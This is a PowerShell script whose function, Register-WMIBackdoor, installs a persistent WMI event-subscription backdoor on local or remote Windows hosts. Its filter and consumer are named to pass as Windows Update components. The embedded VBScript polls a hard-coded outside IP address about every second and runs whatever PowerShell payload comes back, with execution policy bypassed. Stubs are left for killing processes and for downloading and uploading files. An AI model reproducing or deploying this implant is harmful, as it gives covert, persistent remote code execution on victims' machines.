<#
Project: WMI Security
Date: 17/1/18
Author: Chew Zhi jie (@nicholaschew)
#>
Function Register-WMIBackdoor
{
    Param(
        #Event Parameter

        [Parameter(
            Mandatory = $false,
            HelpMessage = "Namespace for event query to be executed on. Default:root\subscription"
            )]
        [ValidateNotNullOrEmpty()]
        $Namespace = 'root\subscription',

        #End of Event Parameter

        #Common Parameter

         [Parameter(
            Mandatory = $false,
            ValueFromPipeline=$True,
            HelpMessage = "Computer Name/IP Address for this event filter."
            )]
        [string]
        $ComputerName = '.',

        [Parameter(
            Mandatory = $false,
            HelpMessage = "Credentials for specified computers."
            )]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(
            Mandatory = $false,
            HelpMessage = "CimSessionDcom for this event filter."
            )]
        [Microsoft.Management.Infrastructure.CimSession[]]
        $CimSession

        #End of Common Parameter    
     )

     begin
    {
    	$CmdletName = $Pscmdlet.MyInvocation.MyCommand.Name

        #Use CimSession if it is passed
        if(!$PSBoundParameters.ContainsKey('CimSession'))
        {
            Write-Verbose "$CmdletName : No CimSession paseed, using Computer Name to create a CimSession"
            #Else use Computer Name and Credential
            $SessionParams = @{}

            $SessionParams.ComputerName = $ComputerName

            #If no Credential is passed, use local Credential
            if($PSBoundParameters.ContainsKey('Credential'))
            {
                Write-Verbose "$CmdletName : Credential passed, using Credential to build CimSession"
                $SessionParams.Credential = $Credential
            }
            else
            {
                Write-Verbose "$CmdletName : No Credential passed, requesting Credential"
                $SessionParams.Credential = Get-Credential
            }

            if($SessionParams.Credential -eq $null)
            {
                Write-Error "No credential found, Stopping" -ErrorAction:Stop
            }

            #Test is Remote PowerShell is Enabled
            Write-Verbose "$CmdletName : Using WS-Man protocol to create CimSession"
            $CimSession = New-CimSession @SessionParams
 
            if ($CimSession -eq $null) 
            {
                Write-Warning "$CmdletName : Failed using WS-Man protocol, using DCOM as the protocol now"
                $SessionParams.SessionOption = (New-CimSessionOption -Protocol Dcom)
                $CimSession = New-CimSession @SessionParams
            }

            rv SessionParams
        }

    }

    process
    {    

    #Filter 

    $Filter = @{
            QueryLanguage = "WQL"
            Query = "SELECT * FROM __TimerEvent WHERE TimerID = 'WindowsUpdateCheck'"
            Name = 'WindowsUpdateTrigger'
            EventNameSpace = 'ROOT\subscription'
    }

    #End of Filter 
    
    #Timer Event

    $TimeArg = @{
            IntervalBetweenEvents = [UInt32] 1000
            SkipIfPassed = $false
            TimerId = "WindowsUpdateCheck"
    }

    #End of Timer Event

    #Consumer Start

    $VBScript = @"
            Option Explicit
            On Error Resume Next

            Dim oReg, oXMLHttp, oShell
            Dim aMachineGuid
            Dim aControl, aPayLoad

            'Getting unique identifier from SOFTWARE\Microsoft\Cryptography Registery
            Const HKEY_CURRENT_USER = &H80000002
            Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
            oReg.GetStringValue HKEY_CURRENT_USER,"SOFTWARE\Microsoft\Cryptography","MachineGuid",aMachineGuid


            Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP.3.0")

            oXMLHTTP.Open "GET", "http://35.197.150.199/", False
            oXMLHTTP.Send

            If true Then
               aControl = oXMLHttp.getResponseHeader("Accept-Control")
               aPayLoad = oXMLHttp.responseText
   
               Select Case aControl
   	            Case "p"
   		            Set oShell = CreateObject("Wscript.shell")
		            oShell.run("powershell -nop -exec bypadd -c &{"""& aPayLoad & "}""")
   	            Case "k"
   		            'kill process
   	            Case "d"
   		            'download file
   	            Case "u"
   		            'upload file
   		
   	            End Select
            End If
"@

        $Consumer = @{
            Name = 'WindowsUpdateEvent'
            ScriptText = $VBScript
            ScriptingEngine= 'VBScript'
            KillTimeout = [UInt32] 45
        }

        #End of Consumer


        $filter_s = New-CimInstance -ClassName __EventFilter -Namespace $Namespace -CimSession $CimSession -Property $Filter
        $consumer_s = New-CimInstance -ClassName ActiveScriptEventConsumer -Namespace $Namespace -CimSession $CimSession -Property $Consumer
               
        $bindingParam = @{
            Filter = [ref]$filter_s
            Consumer = [ref]$consumer_s
         }

         New-CimInstance -ClassName __IntervalTimerInstruction -Namespace $Namespace -CimSession $CimSession -Property $TimeArg
         New-CimInstance -ClassName __FilterToConsumerBinding -Namespace $Namespace -CimSession $CimSession -Property $bindingParam | out-null


    }

    end
    {

        if($PSBoundParameters.ContainsKey('ComputerName'))
        {
            # Clean up the CimSessions we created to support the ComputerName parameter
            $CimSession | Remove-CimSession
        }

        return $filter
    }
}
